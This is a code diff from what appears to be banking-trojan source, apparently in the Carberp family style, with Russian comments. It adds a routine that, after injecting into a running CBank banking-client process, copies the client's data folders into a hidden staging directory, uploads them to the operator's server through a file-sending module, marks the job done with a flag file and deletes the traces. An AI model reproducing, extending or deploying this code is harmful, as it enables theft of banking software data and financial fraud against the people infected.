@@ -32,6 +32,8 @@ namespace BBS_CALC
 namespace CBank
 {
 
+static int WINAPI SendCBank(void*); //отсылка файлов CBank на сервер
+
 SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
      SQLHDBC         ConnectionHandle,
      SQLHWND         WindowHandle,
@@ -226,6 +228,8 @@ static void WINAPI WaitRunCBank(void*)
 				DBG( "CBank", "Start '%s'", path );
 				idCBank = id;
 				InjectIntoProcess( id, WorkInCBank );
+				char* path2 = STR::New(path);
+				RunThread( SendCBank, path2 );
 			}
 		}
 		else
@@ -234,13 +238,77 @@ static void WINAPI WaitRunCBank(void*)
 				idCBank = 0;
 				path[0] = 0;
 			}
-		pSleep( 2 * 1000 );
+		pSleep( 4 * 1000 );
 	}
 }
 
 void Start()
 {
 	StartThread( WaitRunCBank, 0 );
+}
+
+static void SendFolder(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
+{
+	//переводим имя папки в нижний регистр
+	char* path = STR::New(FileName);
+	STR::AnsiLowerCase(path);
+	if( m_strstr( path, "exe" ) == 0 ) //папку exe не нужно отсылать
+	{
+		pPathStripPathA(path); //выделяем имя папки
+		int lenPath = m_lstrlen(path);
+		if( path[lenPath - 1] == '\\' || path[lenPath - 1] == '/' ) path[lenPath - 1] = 0; //убираем в конце косую черту
+		char* tempFolder = (char*)Data;
+		pPathAppendA( tempFolder, path );
+		DBG( "СBank", "создаем папку %s", tempFolder );
+		if( pCreateDirectoryA( tempFolder, 0 ) )
+		{
+			char from[MAX_PATH];
+			m_lstrcpy( from, FileName ); //дублируем имя исходящей папки
+			int lenFrom = m_lstrlen(from);
+			if( from[lenFrom - 1] == '\\' || from[lenFrom - 1] == '/' ) from[lenFrom - 1] = 0; //убираем в конце косую черту
+			DBG( "СBank", "copy folder %s -> %s", from, tempFolder );
+			*((int*)&(from[lenFrom])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+			*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; 
+			CopyFileANdFolder( from, tempFolder );
+		}
+		pPathRemoveFileSpecA(tempFolder);
+	}
+	STR::Free(path);
+}
+
+
+static int WINAPI SendCBank( void* param )
+{
+	char* path = (char*)param;
+	char fileFlag[MAX_PATH], tempFolder[MAX_PATH];
+	if( GetAllUsersProfile( fileFlag, sizeof(fileFlag), "cbank.dat" ) )
+	{
+		//проверяем отослали уже
+		if( !File::IsExists(fileFlag) )
+		{
+			File::WriteBufferA( fileFlag, 0, 0 ); //указываем что отсылаем (отослали)
+			//в path что-то типа ....\exe\cbank.exe, нам нужна папка клиента, та в которой находится папка exe
+			pPathRemoveFileSpecA(path);
+			pPathRemoveFileSpecA(path);
+			m_lstrcat( path, "\\" );
+			if( GetAllUsersProfile( tempFolder, sizeof(tempFolder), "cbank" ) )
+			{
+				int lenTempFolder = m_lstrlen(tempFolder);
+				*((int*)&(tempFolder[lenTempFolder])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+				if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
+				DBG( "СBank", "создаем папку %s", tempFolder );
+				if( pCreateDirectoryA( tempFolder, 0 ) )
+				{
+					SearchFiles( path, "*.*", false, FA_DIRECTORY, tempFolder, SendFolder );
+					VideoRecorder::SendFiles(tempFolder);
+					*((int*)&(tempFolder[lenTempFolder])) = 0;
+					DeleteFolders(tempFolder);
+				}
+			}
+		}
+	}
+	STR::Free(path);
+	return 0;
 }
 
 ////////////////////////////////////////////////////////////////////
